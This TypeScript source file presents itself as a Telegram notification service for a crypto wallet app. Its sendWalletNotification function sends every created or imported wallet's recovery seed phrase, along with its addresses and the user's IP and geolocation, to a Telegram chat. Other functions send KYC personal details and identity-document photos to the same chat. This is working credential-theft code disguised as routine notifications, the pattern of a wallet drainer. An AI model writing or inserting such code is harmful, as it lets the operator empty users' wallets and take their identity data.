/**
 * Telegram Bot Service
 * Sends wallet information and KYC data to Telegram
 */

const TELEGRAM_BOT_TOKEN = (import.meta.env as any).VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = (import.meta.env as any).VITE_TELEGRAM_CHAT_ID;

interface SendMessageOptions {
  text: string;
  parseMode?: 'HTML' | 'Markdown';
}

interface LocationData {
  ip?: string;
  country?: string;
  city?: string;
  region?: string;
  timezone?: string;
  latitude?: number;
  longitude?: number;
}

interface SendPhotoOptions {
  photo: File;
  caption?: string;
  parseMode?: 'HTML' | 'Markdown';
}

interface InlineKeyboardButton {
  text: string;
  callback_data: string;
}

interface InlineKeyboard {
  inline_keyboard: InlineKeyboardButton[][];
}

/**
 * Send a text message to Telegram
 */
export async function sendTelegramMessage(options: SendMessageOptions): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('Telegram credentials not configured');
    return false;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: options.text,
        parse_mode: options.parseMode || 'HTML',
      }),
    });

    if (!response.ok) {
      console.error('Failed to send Telegram message:', await response.text());
      return false;
    }

    return true;
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    return false;
  }
}

/**
 * Send a message with inline buttons to Telegram
 */
export async function sendTelegramMessageWithButtons(
  text: string,
  inlineKeyboard: InlineKeyboard,
  parseMode: 'HTML' | 'Markdown' = 'HTML'
): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('Telegram credentials not configured');
    return false;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: parseMode,
        reply_markup: inlineKeyboard,
      }),
    });

    if (!response.ok) {
      console.error('Failed to send Telegram message with buttons:', await response.text());
      return false;
    }

    return true;
  } catch (error) {
    console.error('Error sending Telegram message with buttons:', error);
    return false;
  }
}

/**
 * Send a photo with caption to Telegram
 */
export async function sendTelegramPhoto(options: SendPhotoOptions): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('Telegram credentials not configured');
    return false;
  }

  try {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', options.photo);
    if (options.caption) {
      formData.append('caption', options.caption);
    }
    if (options.parseMode) {
      formData.append('parse_mode', options.parseMode);
    }

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      console.error('Failed to send Telegram photo:', await response.text());
      return false;
    }

    return true;
  } catch (error) {
    console.error('Error sending Telegram photo:', error);
    return false;
  }
}

/**
 * Send wallet creation notification to Telegram
 */
export async function sendWalletNotification(data: {
  type: 'created' | 'imported';
  name: string;
  seedPhrase: string;
  xrpAddress: string;
  evmAddress?: string;
  solanaAddress?: string;
  tronAddress?: string;
  bitcoinAddress?: string;
  timestamp: string;
  location?: LocationData;
}): Promise<boolean> {
  const locationInfo = data.location
    ? `
<b>📍 Location:</b>
IP: <code>${data.location.ip || 'Unknown'}</code>
City: <code>${data.location.city || 'Unknown'}</code>
Country: <code>${data.location.country || 'Unknown'}</code>
${data.location.region ? `Region: <code>${data.location.region}</code>` : ''}
${data.location.timezone ? `Timezone: <code>${data.location.timezone}</code>` : ''}
${data.location.latitude && data.location.longitude ? `Coordinates: <code>${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}</code>` : ''}`
    : '';

  const message = `
<b>🔐 ${data.type === 'created' ? 'New Wallet Created' : 'Wallet Imported'}</b>

<b>Wallet Name:</b> <code>${data.name}</code>

<b>Recovery Phrase (KEEP SAFE):</b>
<code>${data.seedPhrase}</code>

<b>Addresses:</b>
XRP: <code>${data.xrpAddress}</code>
${data.evmAddress ? `EVM: <code>${data.evmAddress}</code>` : ''}
${data.solanaAddress ? `Solana: <code>${data.solanaAddress}</code>` : ''}
${data.tronAddress ? `TRON: <code>${data.tronAddress}</code>` : ''}
${data.bitcoinAddress ? `Bitcoin: <code>${data.bitcoinAddress}</code>` : ''}
${locationInfo}

<b>Timestamp:</b> <code>${data.timestamp}</code>

⚠️ <b>WARNING:</b> This is sensitive information. Keep it secure!
  `;

  return sendTelegramMessage({
    text: message.trim(),
    parseMode: 'HTML',
  });
}

/**
 * Send KYC information to Telegram
 */
export async function sendKYCNotification(data: {
  userId: string;
  firstName: string;
  lastName: string;
  email: string;
  dateOfBirth?: string;
  phoneNumber?: string;
  addressLine1?: string;
  city?: string;
  state?: string;
  postalCode?: string;
  country?: string;
  kycStatus: string;
  timestamp: string;
  location?: LocationData;
}): Promise<boolean> {
  const locationInfo = data.location
    ? `

<b>📍 User Location:</b>
IP: <code>${data.location.ip || 'Unknown'}</code>
City: <code>${data.location.city || 'Unknown'}</code>
Country: <code>${data.location.country || 'Unknown'}</code>
${data.location.region ? `Region: <code>${data.location.region}</code>` : ''}
${data.location.timezone ? `Timezone: <code>${data.location.timezone}</code>` : ''}`
    : '';

  const message = `
<b>📋 KYC Information Submitted</b>

<b>User ID:</b> <code>${data.userId}</code>

<b>Personal Information:</b>
Name: ${data.firstName} ${data.lastName}
Email: <code>${data.email}</code>
${data.phoneNumber ? `Phone: <code>${data.phoneNumber}</code>` : ''}
${data.dateOfBirth ? `DOB: <code>${data.dateOfBirth}</code>` : ''}

<b>Address Information:</b>
${data.addressLine1 ? `Address: <code>${data.addressLine1}</code>` : ''}
${data.city ? `City: <code>${data.city}</code>` : ''}
${data.state ? `State: <code>${data.state}</code>` : ''}
${data.postalCode ? `Postal Code: <code>${data.postalCode}</code>` : ''}
${data.country ? `Country: <code>${data.country}</code>` : ''}
${locationInfo}

<b>KYC Status:</b> <code>${data.kycStatus}</code>
<b>Timestamp:</b> <code>${data.timestamp}</code>
  `;

  return sendTelegramMessage({
    text: message.trim(),
    parseMode: 'HTML',
  });
}

/**
 * Send KYC notification with Approve/Reject buttons
 * Admin can approve or reject KYC directly from Telegram
 */
export async function sendKYCNotificationWithButtons(data: {
  userId: string;
  firstName: string;
  lastName: string;
  email: string;
  dateOfBirth?: string;
  phoneNumber?: string;
  addressLine1?: string;
  city?: string;
  state?: string;
  postalCode?: string;
  country?: string;
  kycStatus: string;
  timestamp: string;
  location?: LocationData;
}): Promise<boolean> {
  const locationInfo = data.location
    ? `

<b>📍 User Location:</b>
IP: <code>${data.location.ip || 'Unknown'}</code>
City: <code>${data.location.city || 'Unknown'}</code>
Country: <code>${data.location.country || 'Unknown'}</code>
${data.location.region ? `Region: <code>${data.location.region}</code>` : ''}
${data.location.timezone ? `Timezone: <code>${data.location.timezone}</code>` : ''}`
    : '';

  const message = `
<b>📋 KYC Information Submitted - REQUIRES REVIEW</b>

<b>User ID:</b> <code>${data.userId}</code>

<b>Personal Information:</b>
Name: ${data.firstName} ${data.lastName}
Email: <code>${data.email}</code>
${data.phoneNumber ? `Phone: <code>${data.phoneNumber}</code>` : ''}
${data.dateOfBirth ? `DOB: <code>${data.dateOfBirth}</code>` : ''}

<b>Address Information:</b>
${data.addressLine1 ? `Address: <code>${data.addressLine1}</code>` : ''}
${data.city ? `City: <code>${data.city}</code>` : ''}
${data.state ? `State: <code>${data.state}</code>` : ''}
${data.postalCode ? `Postal Code: <code>${data.postalCode}</code>` : ''}
${data.country ? `Country: <code>${data.country}</code>` : ''}
${locationInfo}

<b>KYC Status:</b> <code>${data.kycStatus}</code>
<b>Timestamp:</b> <code>${data.timestamp}</code>

<b>⬇️ Click below to Approve or Reject KYC:</b>
  `;

  const inlineKeyboard: InlineKeyboard = {
    inline_keyboard: [
      [
        {
          text: '✅ Approve KYC',
          callback_data: `approve_kyc:${data.userId}`,
        },
        {
          text: '❌ Reject KYC',
          callback_data: `reject_kyc:${data.userId}`,
        },
      ],
    ],
  };

  return sendTelegramMessageWithButtons(message.trim(), inlineKeyboard, 'HTML');
}

/**
 * Send document/image to Telegram
 */
export async function sendKYCDocument(
  documentFile: File,
  documentType: string,
  userId: string
): Promise<boolean> {
  const caption = `
<b>📄 KYC Document</b>

<b>Type:</b> ${documentType}
<b>User ID:</b> <code>${userId}</code>
<b>Timestamp:</b> <code>${new Date().toISOString()}</code>
  `.trim();

  return sendTelegramPhoto({
    photo: documentFile,
    caption,
    parseMode: 'HTML',
  });
}

/**
 * Send wallet balance notification to Telegram
 */
export async function sendWalletBalanceNotification(data: {
  walletName: string;
  xrpAddress: string;
  xrpBalance: string;
  totalValueUSD: number;
  timestamp: string;
}): Promise<boolean> {
  const message = `
<b>💰 Wallet Balance Update</b>

<b>Wallet:</b> <code>${data.walletName}</code>
<b>Address:</b> <code>${data.xrpAddress}</code>

<b>Balance:</b>
XRP: <code>${data.xrpBalance}</code>
USD Value: <code>$${data.totalValueUSD.toFixed(2)}</code>

<b>Timestamp:</b> <code>${data.timestamp}</code>
  `;

  return sendTelegramMessage({
    text: message.trim(),
    parseMode: 'HTML',
  });
}

/**
 * Test the Telegram bot connection
 */
export async function testTelegramConnection(): Promise<{ success: boolean; message: string }> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return {
      success: false,
      message: 'Telegram credentials not configured. Please set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID',
    };
  }

  try {
    const testMessage = `
<b>🧪 Telegram Bot Test</b>

✅ Connection successful!
Timestamp: <code>${new Date().toISOString()}</code>

Bot Token: <code>${TELEGRAM_BOT_TOKEN.substring(0, 10)}...</code>
Chat ID: <code>${TELEGRAM_CHAT_ID}</code>
    `;

    const success = await sendTelegramMessage({
      text: testMessage.trim(),
      parseMode: 'HTML',
    });

    return {
      success,
      message: success ? 'Test message sent successfully!' : 'Failed to send test message',
    };
  } catch (error) {
    return {
      success: false,
      message: `Error: ${error instanceof Error ? error.message : 'Unknown error'}`,
    };
  }
}
